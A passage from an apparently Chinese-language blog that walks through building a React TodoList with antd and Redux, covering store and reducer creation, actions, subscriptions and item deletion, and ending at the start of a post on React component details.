<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'antd/dist/antd.css'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Input , Button,List &#125; <span class="keyword">from</span> <span class="string">'antd'</span>;<span class="comment">//引入Button</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> data = [</span><br><span class="line">  <span class="string">'React'</span>,</span><br><span class="line">  <span class="string">'Vue'</span>,</span><br><span class="line">  <span class="string">'Android'</span>,</span><br><span class="line">  <span class="string">'IOS'</span>,</span><br><span class="line">  <span class="string">'WebGL'</span>,</span><br><span class="line">];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">        	&lt;Input placeholder=<span class="string">"todo info"</span> style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>&#125;&#125;/&gt;</span><br><span class="line">        	&lt;Button type=<span class="string">"primary"</span>&gt;Primary&lt;<span class="regexp">/Button&gt;</span></span><br><span class="line"><span class="regexp">        	&lt;/</span>div&gt;</span><br><span class="line">        &lt;h3 style=&#123;&#123; <span class="attr">marginBottom</span>: <span class="number">16</span> &#125;&#125;&gt;Default Size&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">        &lt;List</span></span><br><span class="line"><span class="regexp">          bordered</span></span><br><span class="line"><span class="regexp">          dataSource=&#123;data&#125;</span></span><br><span class="line"><span class="regexp">          renderItem=&#123;item =&gt; (&lt;List.Item&gt;&#123;item&#125;&lt;/</span>List.Item&gt;)&#125;</span><br><span class="line">        /&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default TodoList;</span></span><br></pre></td></tr></table></figure>
<p>这是list也是左右满屏，可以做一下微调，可以给list添加样式，如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;List</span><br><span class="line">	style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>,<span class="attr">marginTop</span>:<span class="string">'10px'</span>&#125;&#125;</span><br><span class="line">    bordered</span><br><span class="line">    dataSource=&#123;data&#125;</span><br><span class="line">    renderItem=&#123;item =&gt; (<span class="xml"><span class="tag">&lt;<span class="name">List.Item</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">List.Item</span>&gt;</span></span>)&#125;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure>
<p>这样，List就和Input等宽了。关于antD的其它空间，可以直接去官网查看用法。antD一般用来开发后台页面，效果很快。</p>
<h3 id="四、Store的创建"><a href="#四、Store的创建" class="headerlink" title="四、Store的创建"></a>四、Store的创建</h3><h5 id="4-1-安装Redux"><a href="#4-1-安装Redux" class="headerlink" title="4.1 安装Redux"></a>4.1 安装Redux</h5><p>如果要使用Redux，首先得先安装Redux，可用下面命令安装</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install --save redux</span><br><span class="line">//或</span><br><span class="line">yarn add redux</span><br></pre></td></tr></table></figure>
<h5 id="4-1-创建Store"><a href="#4-1-创建Store" class="headerlink" title="4.1 创建Store"></a>4.1 创建Store</h5><p>在工程的src目录下创建一个名为“store”的文件夹；</p>
<p>在store的文件夹下，创建一个文件叫做index.js；</p>
<p>然后在index.js中引入redux的一个名为createStore方法，利用这个方法就可以创建一个store出来；</p>
<p>如此我们就创建了一个公共数据存储仓库。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store=createStore();</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> store;</span><br></pre></td></tr></table></figure>
<p>此时我们’’图书管理员’’已经创建好了；</p>
<p>但是他却记不住如何管理数据，此时他需要一个”图书记事本”来辅助管理图书；</p>
<p>所以创建’’图书管理员’’时，需要同时创建”图书记事本”，也就是Reducer</p>
<h5 id="4-2-创建Reducer"><a href="#4-2-创建Reducer" class="headerlink" title="4.2 创建Reducer"></a>4.2 创建Reducer</h5><p>在store目录下，创建名为reducer.js的文件；</p>
<p>在里面返回一个函数；</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//state表示整个store中存储的数据</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (state,action)=&gt;&#123;</span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们想要返回指定的state怎么办呢？可以写一个结构，返回如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> defaultState=&#123;</span><br><span class="line">    inputValue:<span class="string">''</span>,</span><br><span class="line">    list:[],</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (state=defaultState,action)=&gt;&#123;</span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们还要把state传给store，怎么传呢？</p>
<p>在store/index.js文件中引入reducer，并且在创建store时，将reducer传给store</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; createStore &#125; <span class="keyword">from</span> <span class="string">'redux'</span>;</span><br><span class="line"><span class="keyword">import</span> reducer <span class="keyword">from</span> <span class="string">'./reducer'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store=createStore(reducer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store;<span class="comment">//注意一定要加上default</span></span><br></pre></td></tr></table></figure>
<p>这时，’’图书管理员’’和”图书记事本”已经绑定起来了？</p>
<p>我们该怎么将store中的数据跟TodoList组件绑定起来呢？刚才我们demo展示的data是写死的数据，可以将之清掉。</p>
<p>然后在TodoList控件中引入该store，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'antd/dist/antd.css'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Input , Button,List &#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./store/index.js'</span>;<span class="comment">//引入store</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">        <span class="keyword">super</span>(props);</span><br><span class="line">        <span class="keyword">this</span>.state=store.getState();</span><br><span class="line">        <span class="comment">//console.log(store.getState());</span></span><br><span class="line">    &#125;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div&gt;</span><br><span class="line">        &lt;div&gt;</span><br><span class="line">        	&lt;Input value=&#123;<span class="keyword">this</span>.state.inputValue&#125; placeholder=<span class="string">"todo info"</span> style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>&#125;&#125;/&gt;</span><br><span class="line">        	&lt;Button type=<span class="string">"primary"</span>&gt;Primary&lt;<span class="regexp">/Button&gt;</span></span><br><span class="line"><span class="regexp">        	&lt;/</span>div&gt;</span><br><span class="line">        &lt;h3 style=&#123;&#123; <span class="attr">marginBottom</span>: <span class="number">16</span> &#125;&#125;&gt;Default Size&lt;<span class="regexp">/h3&gt;</span></span><br><span class="line"><span class="regexp">        &lt;List</span></span><br><span class="line"><span class="regexp">          bordered</span></span><br><span class="line"><span class="regexp">          dataSource=&#123;this.state.list&#125;</span></span><br><span class="line"><span class="regexp">          renderItem=&#123;item =&gt; (&lt;List.Item&gt;&#123;item&#125;&lt;/</span>List.Item&gt;)&#125;</span><br><span class="line">        /&gt;</span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default TodoList;</span></span><br></pre></td></tr></table></figure>
<p>自此已完成store和reducer的创建，那么该如何编写它们呢？</p>
<h5 id="4-3-store和reducer的编写"><a href="#4-3-store和reducer的编写" class="headerlink" title="4.3 store和reducer的编写"></a>4.3 store和reducer的编写</h5><h6 id="1、Redux-DevTools调试工具的安装"><a href="#1、Redux-DevTools调试工具的安装" class="headerlink" title="1、Redux DevTools调试工具的安装"></a>1、Redux DevTools调试工具的安装</h6><p>为了调试redux，首先需要先安装一个redux的插件，名为Redux DevTools</p>
<p>然后在创建store时，添加第二个参数，<a href="https://github.com/zalmoxisus/redux-devtools-extension" target="_blank" rel="noopener">参考</a>如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> store = createStore(reducer,</span><br><span class="line">			<span class="built_in">window</span>.__REDUX_DEVTOOLS_EXTENSION__ &amp;&amp; <span class="built_in">window</span>.__REDUX_DEVTOOLS_EXTENSION__());</span><br></pre></td></tr></table></figure>
<p>这个时候我们就能在浏览器中使用Redux DevTools了，进行redux的调试了。</p>
<p>下面要走改变store中数据的流程</p>
<h6 id="2、改变store中数据"><a href="#2、改变store中数据" class="headerlink" title="2、改变store中数据"></a>2、改变store中数据</h6><p>首先我们想，当我们网input中输入东西时，store中的inputValue发生改变；</p>
<p>我们可以给Input标签一个onChange事件，传入自定义函数handleInputCahnge    ,记得在constructor中对该函数进行this的绑定</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">constructor</span>()&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">this</span>.handleInputChange.bind(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">onChange=&#123;<span class="keyword">this</span>.handleInputChange&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">handleInputChange(event)&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(event.tarent.value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接下来我们要创建一个action，接受input的值，然后将action传给store;</p>
<p>怎么将action的内容传给store呢？store提供了一个方法叫dispatch</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">handleInputChange(event)&#123;</span><br><span class="line">    <span class="keyword">const</span> action=&#123;</span><br><span class="line">        type:<span class="string">"change_input_value"</span>,</span><br><span class="line">        value:event.target.value,</span><br><span class="line">    &#125;;</span><br><span class="line">    store.dispatch(action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>store接收到action传来的数据，该怎么处理呢？它需要查”图书记事本”reducer，它需要拿着action和当前store中数据一起转发给reducer，然后reducer告诉store来做什么。</p>
<p>幸运的是store给reducer传递数据已经自动化完成了，无需我们再做。我们只需要再reducer中对当前的数据和action进行数据的更新。比如可以如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//store表示当前数据，也就是preState，action表示动作</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (state=defaultState,action)=&gt;&#123;</span><br><span class="line">    <span class="keyword">if</span>(action.type===<span class="string">'change_input_value'</span>)&#123;</span><br><span class="line">        <span class="comment">//对当前state做一个深拷贝</span></span><br><span class="line">        <span class="keyword">const</span> newState=<span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(state));</span><br><span class="line">        newState.inputValue=action.value;</span><br><span class="line">        <span class="keyword">return</span> newState;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>注意：reducer可以接收state，但是绝对不能修改state</strong></p>
<h6 id="3、完成action的传递和TodoList中Input的更新"><a href="#3、完成action的传递和TodoList中Input的更新" class="headerlink" title="3、完成action的传递和TodoList中Input的更新"></a>3、完成action的传递和TodoList中Input的更新</h6><p>此时reducer返回的state就给了store，然后store就可以把新数据替换掉老数据。如何让组件能实时更新呢？</p>
<p>需要让TodoList组件订阅store，在订阅接口中编写我们的更新函数即可；</p>
<p>更新函数中，只需要对store重新getState，然后setState即可；</p>
<p>这样store发生改变，TodoList就会发生更新了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> React, &#123; Component &#125; <span class="keyword">from</span> <span class="string">'react'</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="string">'antd/dist/antd.css'</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Input , Button , List&#125; <span class="keyword">from</span> <span class="string">'antd'</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./store/index'</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TodoList</span> <span class="keyword">extends</span> <span class="title">Component</span> </span>&#123;</span><br><span class="line">	<span class="keyword">constructor</span>(props)&#123;</span><br><span class="line">		<span class="keyword">super</span>(props);</span><br><span class="line">		<span class="keyword">this</span>.state=store.getState();</span><br><span class="line">		<span class="keyword">this</span>.handleInputChange.bind(<span class="keyword">this</span>);</span><br><span class="line">		<span class="keyword">this</span>.handleStoreChange=<span class="keyword">this</span>.handleStoreChange.bind(<span class="keyword">this</span>);</span><br><span class="line">		store.subscribe(<span class="keyword">this</span>.handleStoreChange);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	  render() &#123;</span><br><span class="line">	    <span class="keyword">return</span> (</span><br><span class="line">	      &lt;div style=&#123;&#123;<span class="attr">marginTop</span>:<span class="string">'10px'</span> , <span class="attr">marginLeft</span>:<span class="string">'10px'</span>&#125;&#125;&gt;</span><br><span class="line">	        &lt;div&gt;</span><br><span class="line">	        		&lt;Input </span><br><span class="line">	        			value=&#123;<span class="keyword">this</span>.state.inputValue&#125; placeholder=<span class="string">"todo info"</span> </span><br><span class="line">	        			style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>,<span class="attr">marginRight</span>:<span class="string">'10px'</span>&#125;&#125; </span><br><span class="line">	        			onChange=&#123;<span class="keyword">this</span>.handleInputChange&#125;/&gt;</span><br><span class="line">	        		&lt;Button type=<span class="string">"primary"</span>&gt;提交&lt;<span class="regexp">/Button&gt;</span></span><br><span class="line"><span class="regexp">	        	&lt;/</span>div&gt;</span><br><span class="line">	        &lt;List</span><br><span class="line">	        	  style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>,<span class="attr">marginTop</span>:<span class="string">'10px'</span>&#125;&#125;</span><br><span class="line">	          bordered</span><br><span class="line">	          dataSource=&#123;<span class="keyword">this</span>.state.list&#125;</span><br><span class="line">	          renderItem=&#123;item =&gt; (<span class="xml"><span class="tag">&lt;<span class="name">List.Item</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">List.Item</span>&gt;</span></span>)&#125;</span><br><span class="line">	        /&gt;</span><br><span class="line">	      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">	    );</span></span><br><span class="line"><span class="regexp">	  &#125;</span></span><br><span class="line"><span class="regexp">	  </span></span><br><span class="line"><span class="regexp">	  handleInputChange(event)&#123;</span></span><br><span class="line"><span class="regexp">		    const action=&#123;</span></span><br><span class="line"><span class="regexp">		        type:"change_input_value",</span></span><br><span class="line"><span class="regexp">		        value:event.target.value,</span></span><br><span class="line"><span class="regexp">		    &#125;;</span></span><br><span class="line"><span class="regexp">		    store.dispatch(action);</span></span><br><span class="line"><span class="regexp">		&#125;</span></span><br><span class="line"><span class="regexp">	  </span></span><br><span class="line"><span class="regexp">	  /</span><span class="regexp">/当感知到数据发生变化时，就回去新的state数据</span></span><br><span class="line"><span class="regexp">	  handleStoreChange(event)&#123;</span></span><br><span class="line"><span class="regexp">	  	this.setState(store.getState());</span></span><br><span class="line"><span class="regexp">	  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default TodoList;</span></span><br></pre></td></tr></table></figure>
<h6 id="4、完成提交按钮，实现list的更新"><a href="#4、完成提交按钮，实现list的更新" class="headerlink" title="4、完成提交按钮，实现list的更新"></a>4、完成提交按钮，实现list的更新</h6><p>希望点击按钮时，把input中的数据存在store中的list数组中</p>
<p>首先给Button绑定一个onClick事件，（记得在constructor中绑定this）</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Button type=<span class="string">"primary"</span> onClick=&#123;<span class="keyword">this</span>.handleBtnClick&#125;&gt;提交&lt;<span class="regexp">/Button&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后编写handleBtnClick的方法，先创建一个action，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">handleBtnClick(event)&#123;</span><br><span class="line">	  	<span class="keyword">const</span> action=&#123;</span><br><span class="line">		    type:<span class="string">"add_todo_item"</span>,</span><br><span class="line">		&#125;;</span><br><span class="line">		store.dispatch(action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意这里action只定义了事件类型，没有传值，这是因为要改变的数据可以放在reducer中处理，此时可以在reducer中处理这个事件了</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(action.type===<span class="string">'add_todo_item'</span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> newState=<span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(state));</span><br><span class="line">        <span class="comment">//将input中的值添加到list</span></span><br><span class="line">    	newState.list.push(newState.inputValue);</span><br><span class="line">        <span class="comment">//清空input</span></span><br><span class="line">    	newState.inputValue=<span class="string">''</span>;</span><br><span class="line">		<span class="keyword">return</span> newState;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<h3 id="五、完成TodoList的删除"><a href="#五、完成TodoList的删除" class="headerlink" title="五、完成TodoList的删除"></a>五、完成TodoList的删除</h3><p>在上面已经熟悉了redux的流程，这里就当回顾，顺便实现TodoList的删除的删除</p>
<p>首先我们对List组件的每一项进行事件绑定，List的每一项是通过List.Item进行绑定的，所以我们只需要对List.Item进行事件绑定即可</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;List</span><br><span class="line">	        	  style=&#123;&#123;<span class="attr">width</span>:<span class="string">'300px'</span>,<span class="attr">marginTop</span>:<span class="string">'10px'</span>&#125;&#125;</span><br><span class="line">	          bordered</span><br><span class="line">	          dataSource=&#123;<span class="keyword">this</span>.state.list&#125;</span><br><span class="line">	          renderItem=&#123;(item,index) =&gt; (<span class="xml"><span class="tag">&lt;<span class="name">List.Item</span> <span class="attr">onClick</span>=<span class="string">&#123;this.handleItemDelete.bind(this,index)&#125;</span>&gt;</span>&#123;item&#125;<span class="tag">&lt;/<span class="name">List.Item</span>&gt;</span></span>)&#125;</span><br><span class="line">	        /&gt;</span><br></pre></td></tr></table></figure>
<p>然后我们写handleItemDelete这个方法,    接受一个index 的参数，在里面创建action，传递index，然后传递action</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">handleItemDelete(index)&#123;</span><br><span class="line">	  	<span class="keyword">const</span> action=&#123;</span><br><span class="line">		        type:<span class="string">"delete_todo_item"</span>,</span><br><span class="line">		        index,</span><br><span class="line">		&#125;;</span><br><span class="line">		store.dispatch(action);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>最后在reducer中判断delete_todo_item事件，根据index在list中删除相应下标的数据</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(action.type===<span class="string">'delete_todo_item'</span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> newState=<span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(state));</span><br><span class="line">        newState.list.splice(action.index,<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">return</span> newState;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>最终我们的reducer.js文件内容如下</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> defaultState = &#123;</span><br><span class="line">    inputValue:<span class="string">''</span>,</span><br><span class="line">    list:  []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> (state=defaultState,action)=&gt;&#123;</span><br><span class="line">	<span class="keyword">if</span>(action.type===<span class="string">'change_input_value'</span>)&#123;</span><br><span class="line">        <span class="comment">//对当前state做一个深拷贝</span></span><br><span class="line">        <span class="keyword">const</span> newState=<span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(state));</span><br><span class="line">        newState.inputValue=action.value;</span><br><span class="line">        <span class="keyword">return</span> newState;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(action.type===<span class="string">'add_todo_item'</span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> newState=<span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(state));</span><br><span class="line">        newState.list.push(newState.inputValue);</span><br><span class="line">        newState.inputValue=<span class="string">''</span>;</span><br><span class="line">		<span class="keyword">return</span> newState;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(action.type===<span class="string">'delete_todo_item'</span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> newState=<span class="built_in">JSON</span>.parse(<span class="built_in">JSON</span>.stringify(state));</span><br><span class="line">        newState.list.splice(action.index,<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">return</span> newState;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> state;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/09/06/react中Redux的使用/" data-id="ck55it3mg002ycglrm4xo0vxn" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/React/">React</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-react组件细节" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/29/react组件细节/" class="article-date">
  <time datetime="2018-08-29T15:04:35.000Z" itemprop="datePublished">2018-08-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/29/react组件细节/">react组件细节</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="一-、React细节基础"><a href="#一-、React细节基础" class="headerlink" title="一 、React细节基础"></a>一 、React细节基础</h2><h3 id="1、Fragment，去掉多余的外出div"><a href="#1、Fragment，去掉多余的外出div" class="headerlink" title="1、Fragment，去掉多余的外出div"></a>1、Fragment，去掉多余的外出div</h3><p>在组件的类中，render方法中所有的标签都得包含在一个div中，这样在生产的html页面中就会始终多一个div，要去掉这个最外层多余的div怎么办呢？</p>
